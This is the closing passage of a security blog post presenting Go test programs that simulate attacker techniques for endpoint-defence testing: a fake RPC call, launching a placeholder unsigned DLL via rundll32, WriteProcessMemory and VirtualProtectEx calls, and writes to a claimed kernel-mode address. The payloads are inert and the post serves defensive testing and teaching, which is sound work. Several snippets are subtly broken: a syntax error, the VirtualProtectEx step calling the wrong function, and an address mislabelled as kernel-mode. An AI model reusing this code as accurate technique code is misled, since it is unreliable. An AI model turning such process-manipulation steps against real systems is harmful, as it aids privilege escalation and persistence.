</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		<span style="color:#6272a4">// attacker replaced DOM vtable pointer with NdrServerCall2 -&gt; bypassing CFG check
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		_, err = syscall.<span style="color:#50fa7b">GetProcAddress</span>(windows.<span style="color:#50fa7b">NewLazyDLL</span>(<span style="color:#f1fa8c">&#34;rpcrt4.dll&#34;</span>).<span style="color:#50fa7b">Handle</span>(), <span style="color:#f1fa8c">&#34;NdrServerCall2&#34;</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to find NdrServerCall2: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Simulated RPC function call with memory manipulation&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Potential browser exploit via fake RPC messages executed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">101</span>) <span style="color:#6272a4">// UNPROTECTED: Malicious behavior not blocked
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">cleanup</span>() {
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Cleanup completed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">100</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><h2 id="suspicious-api-from-an-unsigned-service-dll">suspicious API from an unsigned service DLL</h2>
<p>here, the attacker loads a malicious, unsigned DLL into a service process like <code>svchost.exe</code> (a critical system process), then uses that DLL to execute suspicious APIs. this is often used to maintain persistence or for privilege escalation.</p>
<p>the test creates an unsigned DLL and attempts to load it into <code>svchost.exe</code>. after loading the DLL, the test simulates suspicious API calls (<code>WriteProcessMemory</code>, <code>VirtualProtectEx</code>), which are usually used to modify the memory of other process or to change permissions on executable code.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">var</span> serviceDLLPath = <span style="color:#f1fa8c">&#34;C:\\Windows\\Temp\\suspicious.dll&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">main</span>() {
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Starting Suspicious API from an Unsigned Service DLL [+]&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Start</span>(test, cleanup)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// create new unsigned DLL
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	dllContent <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd;font-style:italic">byte</span>(<span style="color:#f1fa8c">&#34;test DLL file&#34;</span>)
</span></span><span style="display:flex;"><span>	err <span style="color:#ff79c6">:=</span> os.<span style="color:#50fa7b">WriteFile</span>(serviceDLLPath, dllContent, <span style="color:#bd93f9">0644</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to create DLL file: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Unsigned DLL file created&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// load DLL into svchost.exe
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	cmd <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;rundll32.exe&#34;</span>, serviceDLLPath<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#34;,ServiceMain&#34;</span>)
</span></span><span style="display:flex;"><span>	err = cmd.<span style="color:#50fa7b">Start</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to load DLL into svchost.exe: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] DLL loaded into svchost.exe&#34;</span>)
</span></span><span style="display:flex;"><span>	time.<span style="color:#50fa7b">Sleep</span>(<span style="color:#bd93f9">3</span> <span style="color:#ff79c6">*</span> time.Second)
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Simulate suspicious API calls
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#50fa7b">simulateSuspiciousAPICalls</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">101</span>) <span style="color:#6272a4">// UNPROTECTED: Malicious behavior not blocked
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">simulateSuspiciousAPICalls</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// WriteProcessMemory call
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#8be9fd;font-style:italic">var</span> kernel32 = windows.<span style="color:#50fa7b">NewLazySystemDLL</span>(<span style="color:#f1fa8c">&#34;kernel32.dll&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#8be9fd;font-style:italic">var</span> procWriteProcessMemory = kernel32.<span style="color:#50fa7b">NewProc</span>(<span style="color:#f1fa8c">&#34;WriteProcessMemory&#34;</span>)
</span></span><span style="display:flex;"><span>	processHandle, err <span style="color:#ff79c6">:=</span> windows.<span style="color:#50fa7b">OpenProcess</span>(windows.PROCESS_ALL_ACCESS, <span style="color:#ff79c6">false</span>. <span style="color:#8be9fd;font-style:italic">uint32</span>(os.<span style="color:#50fa7b">Getpid</span>()))
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to open process: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#8be9fd;font-style:italic">var</span> written <span style="color:#8be9fd">uint32</span>
</span></span><span style="display:flex;"><span>	buffer <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd;font-style:italic">byte</span>(<span style="color:#f1fa8c">&#34;memorywrite&#34;</span>)
</span></span><span style="display:flex;"><span>	addr <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">uintptr</span>(<span style="color:#bd93f9">0x00000001</span>)
</span></span><span style="display:flex;"><span>	ret, _, err <span style="color:#ff79c6">:=</span> procWriteProcessMemory.<span style="color:#50fa7b">Call</span>(<span style="color:#8be9fd;font-style:italic">uintptr</span>(processHandle), addr, <span style="color:#8be9fd;font-style:italic">uintptr</span>(unsafe.<span style="color:#50fa7b">Pointer</span>(<span style="color:#ff79c6">&amp;</span>buffer[<span style="color:#bd93f9">0</span>])), <span style="color:#8be9fd;font-style:italic">uintptr</span>(<span style="color:#8be9fd;font-style:italic">len</span>(buffer)), <span style="color:#8be9fd;font-style:italic">uintptr</span>(unsafe.<span style="color:#50fa7b">Pointer</span>(<span style="color:#ff79c6">&amp;</span>written)))
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> ret <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] WriteProcessMemory failed: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] WriteProcessMemory executed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Simulate VirtualProtectEx call
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#8be9fd;font-style:italic">var</span> oldProtect <span style="color:#8be9fd">uint32</span>
</span></span><span style="display:flex;"><span>	addr = <span style="color:#8be9fd;font-style:italic">uintptr</span>(<span style="color:#bd93f9">0x00000001</span>)
</span></span><span style="display:flex;"><span>	size <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">uintptr</span>(<span style="color:#bd93f9">1024</span>)
</span></span><span style="display:flex;"><span>	newProtect <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">uint32</span>(windows.PAGE_EXECUTE_READWRITE)
</span></span><span style="display:flex;"><span>	ret, _, err = syscall.<span style="color:#50fa7b">Syscall6</span>(procWriteProcessMemory.<span style="color:#50fa7b">Addr</span>(), <span style="color:#bd93f9">5</span>, <span style="color:#8be9fd;font-style:italic">uintptr</span>(processHandle), addr, size, <span style="color:#8be9fd;font-style:italic">uintptr</span>(newProtect), <span style="color:#8be9fd;font-style:italic">uintptr</span>(unsafe.<span style="color:#50fa7b">Pointer</span>(<span style="color:#ff79c6">&amp;</span>oldProtect)), <span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> ret <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] VirtualProtectEx failed: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] VirtualProtectEx executed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">cleanup</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Remove the created DLL file
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	err <span style="color:#ff79c6">:=</span> os.<span style="color:#50fa7b">Remove</span>(serviceDLLPath)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to remove DLL file: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">103</span>) <span style="color:#6272a4">// Cleanup failed
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] DLL file removed&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">100</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><h2 id="suspicious-kernel-mode-address-manipulation">suspicious kernel mode address manipulation</h2>
<p>attackers try to modify memory in the kernel space from a user mode process, which is an obvious attempt at privilege escalation. manipulating kernel memory can allow attackers to gain <strong>complete control</strong> over the system.</p>
<p>the test attempts to allocate memory in a kernel mode address range, which is normally inaccessible to user mode processes. attackers do this to exploit a vulnerability that can allow them to write to or execute code in the kernel space.</p>
<p>the test then tries to change the memory protection on the allocated kernel mode memory.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">main</span>() {
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Starting Suspicious Kernel Mode Address Manipulation [+]&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Start</span>(test, cleanup)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Attempt to allocate and modify memory in a kernel mode address range
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	kernelAddress <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">uintptr</span>(<span style="color:#bd93f9">0x1000000000000</span>) <span style="color:#6272a4">// Example kernel mode address
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	size <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">uintptr</span>(<span style="color:#bd93f9">1024</span>)                     <span style="color:#6272a4">// Memory size
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	oldProtect <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">uint32</span>(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>	newProtect <span style="color:#ff79c6">:=</span> windows.PAGE_EXECUTE_READWRITE
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Allocate memory at the kernel mode address
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	addr, err <span style="color:#ff79c6">:=</span> windows.<span style="color:#50fa7b">VirtualAlloc</span>(kernelAddress, size, windows.MEM_COMMIT|windows.MEM_RESERVE, newProtect)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> <span style="color:#ff79c6">||</span> addr <span style="color:#ff79c6">!=</span> kernelAddress {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to allocate memory at kernel mode address: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Successfully allocated memory at kernel mode address&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Modify memory protection
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	err = windows.<span style="color:#50fa7b">VirtualProtect</span>(kernelAddress, size, newProtect, <span style="color:#ff79c6">&amp;</span>oldProtect)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to change memory protection at kernel mode address: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Successfully changed memory protection at kernel mode address&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Write to the kernel mode address
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	data <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">byte</span>{<span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>, <span style="color:#bd93f9">0x90</span>} <span style="color:#6272a4">// NOP instructions
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	written <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">uint32</span>(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>	err = windows.<span style="color:#50fa7b">WriteProcessMemory</span>(windows.<span style="color:#50fa7b">CurrentProcess</span>(), kernelAddress, <span style="color:#ff79c6">&amp;</span>data[<span style="color:#bd93f9">0</span>], <span style="color:#8be9fd;font-style:italic">uintptr</span>(<span style="color:#8be9fd;font-style:italic">len</span>(data)), <span style="color:#ff79c6">&amp;</span>written)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> <span style="color:#ff79c6">||</span> written <span style="color:#ff79c6">!=</span> <span style="color:#8be9fd;font-style:italic">uint32</span>(<span style="color:#8be9fd;font-style:italic">len</span>(data)) {
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] Failed to write to kernel mode address: %s&#34;</span>, err))
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Successfully wrote to kernel mode address&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">101</span>) <span style="color:#6272a4">// UNPROTECTED: Malicious behavior not blocked
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">cleanup</span>() {
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Cleanup completed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">100</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><h2 id="conclusion">conclusion</h2>
<p>i wanted to write code that was much more than just &ldquo;simple&rdquo; scripts. i wanted to write comprehensive tools that would help uncover and understand the more sophisticated and insidious aspects of modern threats. testing for techniques like process hollowing, API hooking, and kernel memory manipulation can hopefully offer some technical and educational value to my peers in the field, as i myself have gleaned from their learning and experience over the years.</p>
<p>happy hacking!</p>
</main>



<footer>
  <div class="footer-nav">
    
    <a class="next" href="/posts/gol0/" style="float: right"
      >next: goL0: reverse engineering &#43; malware analysis</a
    >
     
    <a class="previous" href="/posts/new_post14/">previous</a>
    
  </div>
</footer>



<script defer>
  document.addEventListener("keydown", function (e) {
    if (document.activeElement.isContentEditable) {
      return false;
    }
    if (document.activeElement.tagName == "INPUT") {
      return false;
    }
    if (e.altKey || e.ctrlKey || e.shiftKey) {
      return false;
    }
    var key = e.key;
    if (key === "h") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = "/";
    } else if (key === "t") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = `https://${location.hostname}/tags`;
    } else if (key === "i") {
      e.preventDefault();
      e.stopPropagation();
      const inputs = document.querySelectorAll("input");
      for (let i = 0; i < inputs.length; i++) {
        if (inputs[i].offsetParent !== null) {
          inputs[i].selectionStart = inputs[i].selectionEnd =
            inputs[i].value.length;
          inputs[i].focus();
          break;
        }
      }
    }
    return false;
  });
</script>


<script defer>
  function throttle(fn, wait) {
    var time = Date.now();
    return function () {
      var now = Date.now()
      if (time + wait - now < 0) {
        fn();
        time = now;
      }
    };
  }

  function scrollHandler() {
    const anchors = Array.from(document.querySelectorAll("body h2, body h3"));

    function scrollCallback() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop;

      
      for (var i = 0; i < anchors.length; i++) {
        var anchorId = anchors[i].getAttribute("id");
        var link = document.querySelector(
          'nav ul li a[href="#' + anchorId + '"]',
        );
        if (link) {
          link.classList.remove("active-toc");
        }
      }

      
      for (var i = anchors.length - 1; i >= 0; i--) {
        var offsetTop = anchors[i].offsetTop;
        if (scrollTop > offsetTop - 75) {
          var anchorId = anchors[i].getAttribute("id");
          var link = document.querySelector(
            'nav ul li a[href="#' + anchorId + '"]',
          );
          if (link) {
            link.classList.add("active-toc");
            break;
          }
        }
      }
    }

    window.addEventListener(
      "scroll",
      throttle(scrollCallback, 300),
    );
  }
  setTimeout(scrollHandler, 100);
</script>

<script defer>
  function addCopyButtonToCodeBlocks() {
    
    const codeBlocks = document.querySelectorAll('code[class^="language-"]');

    codeBlocks.forEach((codeBlock) => {
      const copyButton = document.createElement("button");
      copyButton.classList.add("copy-code-button");
      copyButton.innerHTML = "copy";

      
      copyButton.addEventListener("click", () => {
        
        const elements = codeBlock.querySelectorAll(".cl");
        let codeToCopy = "";
        elements.forEach((element) => {
          codeToCopy += element.innerText;
        });
        navigator.clipboard.writeText(codeToCopy);

        
        copyButton.innerHTML = "copied!";
        setTimeout(() => {
          copyButton.innerHTML = "copy";
        }, 1500);
      });

      
      codeBlock.parentNode.before(copyButton);
    });
  }
  setTimeout(function () {
    addCopyButtonToCodeBlocks();
  }, 100);
</script>